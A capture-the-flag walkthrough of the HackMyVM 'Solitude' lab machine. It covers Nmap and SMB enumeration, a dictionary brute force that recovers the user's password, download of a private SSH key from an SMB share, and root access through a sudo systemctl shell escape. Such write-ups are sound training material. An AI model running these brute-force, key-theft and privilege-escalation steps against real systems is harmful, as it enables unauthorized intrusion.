@@ -1,0 +1,120 @@
+---
+title: Solitude
+date: '2025-03-15'
+description: ''
+type: writeup
+platform: hackmyvm
+tags:
+  - Easy
+  - LINUX
+  - SMB
+cover: /mc/uploads/2025/03/393884.jpg
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+In this walkthrough, we explore the process of compromising the Solitude machine. We will cover steps from initial network enumeration to privilege escalation, using tools such as **Nmap**, **enum4linux-ng**, **nxc**, and a **GTFOBins** technique.
+
+## Enumeration with Nmap
+
+We begin by scanning the target (IP: 192.168.56.129) to identify open ports and services. Our Nmap command detects several services, including SSH on port 22, HTTP on port 80, and SMB on ports 139 and 445:
+
+```bash
+nmap -sV 192.168.56.129
+
+-----------------OUTPUT------------------------------
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
+139/tcp open  netbios-ssn Samba smbd 4
+445/tcp open  netbios-ssn Samba smbd 4
+```
+Since the Apache server on port 80 displays only a default page, our focus shifts to the SMB services.
+
+## Enumerating SMB Services
+
+Next, we perform a more detailed enumeration of the SMB service using **enum4linux-ng**. This tool helps us gather valuable information about the target’s users via RPC:
+
+```bash
+./enum4linux-ng.py 192.168.56.129 -A
+
+------------------------------OUTPUT------------------------
+ =======================================
+|    Users via RPC on 192.168.56.129    |
+ =======================================
+[*] Enumerating users via 'querydispinfo'
+[+] Found 1 user(s) via 'querydispinfo'
+[*] Enumerating users via 'enumdomusers'
+[+] Found 1 user(s) via 'enumdomusers'
+[+] After merging user results we have 1 user(s) total:
+'1000':
+  username: garret
+  name: garret
+  acb: '0x00000010'
+  description: ''
+```
+We discover the username **garret** on the system.
+
+## Brute-Forcing SMB Credentials
+
+we have the username , so we going to discover a valid password. We use **nxc** for brute forcing against the SMB service with a password dictionary:
+
+```bash
+nxc smb 192.168.56.129 -u 'garret' -p fuzzDicts/passwordDict/top6000.txt
+
+----------
+SMB         192.168.56.129  445    SOLITUDE         
+[+] SOLITUDE\garret:inuyasha 
+----------
+```
+The tool successfully identifies the password as **inuyasha** for user **garret**.
+
+## FootHold
+
+since we have a valid credentials , we are going to authenticate with SMB using **smbclient**:
+
+```bash
+smbclient //192.168.56.129/shared -U garret%inuyasha
+```
+After logging in, listing the directory reveals a hidden folder (.ssh) containing SSH keys:
+
+```bash
+smb: \> ls
+  .                                   D        0  Wed Nov 27 08:10:21 2024
+  ..                                  D        0  Wed Nov 27 08:38:37 2024
+  .ssh                               DH        0  Wed Nov 27 08:10:21 2024
+
+                12791912 blocks of size 1024. 5175344 blocks available
+```
+We navigate into the **.ssh** folder to retrieve the private key (`id_rsa`):
+
+```bash
+smb: \.ssh\> get id_rsa
+```
+After downloading, we adjust the key’s permissions and use it to SSH into the target machine:
+
+```bash
+chmod 600 id_rsa && ssh garret@192.168.56.129 -i id_rsa
+
+garret@solitude:~$
+```
+## Priv escalation
+
+After gaining shell access, it’s important to check which sudo commands the current user can run. Execute:
+
+```bash
+sudo -l
+User garret may run the following commands on solitude:
+    (ALL) NOPASSWD: /usr/bin/systemctl
+```
+Referencing [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/), we identify that systemctl can be abused for privilege escalation. By running:
+
+```bash
+sudo /usr/bin/systemctl
+!sh
+
+# whoami
+root
+```
+**ROOTED**
